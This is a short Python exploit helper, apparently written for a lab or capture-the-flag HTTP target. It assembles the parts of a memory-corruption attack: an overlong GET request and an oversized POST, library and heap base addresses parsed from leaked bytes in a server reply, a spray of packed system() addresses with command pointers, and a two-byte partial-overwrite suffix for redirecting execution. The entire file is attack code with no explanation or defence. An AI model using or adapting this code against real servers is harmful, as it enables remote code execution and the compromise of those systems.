import struct


def construct(reply, system_addr, cmd_ptr, redirect):
    request = b"GET /inventory/" + b"+" * 512 + b" HTTP/1.1\r\nHost: lab\r\n\r\n"
    upload = b"POST /documents HTTP/1.1\r\nContent-Length: 8193\r\n\r\n"
    library = int.from_bytes(reply[48:56], "little") & ~0xfff
    arena = int.from_bytes(reply[80:88], "little")
    block = arena & ~0xffff
    tiled = struct.pack('<QQQ', system_addr, cmd_ptr, 0) * 128
    suffix = bytes([redirect & 0xff, (redirect >> 8) & 0xff])
    return request, upload, library, block, tiled, suffix
